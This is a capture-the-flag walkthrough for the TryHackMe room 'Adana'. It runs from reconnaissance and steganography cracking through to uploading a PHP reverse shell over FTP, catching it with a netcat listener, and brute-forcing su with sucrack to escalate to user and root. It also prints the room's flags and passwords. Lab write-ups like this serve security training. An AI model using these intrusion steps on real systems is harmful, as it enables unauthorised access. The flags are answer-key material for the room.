CTF URL: https://tryhackme.com/r/room/adana
# IP
```
10.10.175.138
```
# Reconaisance
## NMAP
```bash
nmap -sS  10.10.175.138  
21/tcp open  ftp
80/tcp open  http
```
## WEB
### Dirb
```bash
dirb http://10.10.175.138/
# result
announcements/
```
### Nikto
```bash
nikto -h 10.10.175.138
# result
/phpmyadmin
```
### at port 80
add `adana.thm` to `/etc/hosts`
Wordpress
User: `hakanbey01`
in `/announcments/` there is wordlist and a photo
# Steg
```bash
stegcracker austrailian-bulldog-ant.jpg  wordlist.txt 
```
gives `123adanaantinwar`
```bash
steghide extract -sf austrailian-bulldog-ant.jpg     
Enter passphrase: 
wrote extracted data to "user-pass-ftp.txt".

cat user-pass-ftp.txt               
RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
# which is 
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```
# FTP
We can login, and can upload smth. But it is not affecting the website. NOTHING CHANGES ON WEBSITE. 
But, `wp-config.php` seems interesting. it reveals
```php
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```
`phpmyadmin:12345`
# phpmyadmin
```
Database server
    Server: Localhost via UNIX socket
    Server type: MySQL
    Server version: 5.7.32-0ubuntu0.18.04.1 - (Ubuntu)
    Protocol version: 10
    User: phpmyadmin@localhost
    Server charset: UTF-8 Unicode (utf8)

Web server
     Apache/2.4.29 (Ubuntu)
    Database client version: libmysql - mysqlnd 5.0.12-dev - 20150407 - $Id: 3591daad22de08524295e1bd073aceeff11e6579 $
    PHP extension: mysqliDocumentation curlDocumentation mbstringDocumentation
    PHP version: 7.2.24-0ubuntu0.18.04.7

phpMyAdmin
 Version information: 4.6.6deb5ubuntu0.5 
```

user found `hakanbey01:$P$BQML2QxAFBH4hb.qqKTpDnta6Q6Wl2/`, but cannot crack it
and another `$P$BEyLE6bPLjgWQ3IHrLu3or19t0faUh.`. There are two dbs: phpmyadmin and phpmyadmin1. Seems like clones. 

# Rev Shell

From `phpmyadmin1.wp_options` new subdomain found `http://subdomain.adana.thm`
and this points to website.  Seems like FTP is connected to it. 

let's upload a shell. (put and then chmod)
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
put it there and navigate to `http://subdomain.adana.thm/php-reverse-shell.php`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 1234           
listening on [any] 1234 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.85.38] 48176
Linux ubuntu 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:09:56 up  1:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
stabilization and first web flag 
```
www-data@ubuntu:/$ cat /var/www/html/wwe3bbfla4g.txt 
THM{343a7e2064a1d992c01ee201c346edff}
```
# PrivEsc to User
sucrack was as keyword to the thm room. 
https://github.com/hemp3l/sucrack

upload found wordlist, sucrack tool to the ftp server, and chmod 777 them.
```bash
cd sucrack
./configure 
make
sucrack -u hakanbey -w 100 wordlist.txt
```

it will not work as I found that someone found that passwords start with`123adana`.
So,
```bash
awk '{print "123adana" $0}' wordlist.txt > new-wordlist.txt
sucrack/src/sucrack -u hakanbey -w 100 new-wordlist.txt
```

`hakanbey:123adanasubaru`
```bash
hakanbey@ubuntu:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt   website
hakanbey@ubuntu:~$ cat user.txt 
THM{8ba9d7715fe726332b7fc9bd00e67127}
```

# PrivEsc to root
```bash
find /usr/bin -group hakanbey 2>/dev/null | more # finds /usr/bin/binary
/usr/bin/binary # gives some game
strings /usr/bin/binary

ltrace /usr/bin/binary # can be used for debugging
# it gives passwords warzoneinadana

hakanbey@ubuntu:~$ /usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/root.jpg

```
Move jpg to your machine.

`hexeditor root.jpg`
at position `00000020`
```
FE E9 9D 3D  79 18 5F FC   82 6D DF 1C  69 AC C2 75 
```
hint says from hex to base85
`root:Go0odJo0BbBro0o`
```
root@ubuntu:/home/hakanbey# cat /root/root.txt 
THM{c5a9d3e4147a13cbd1ca24b014466a6c}
```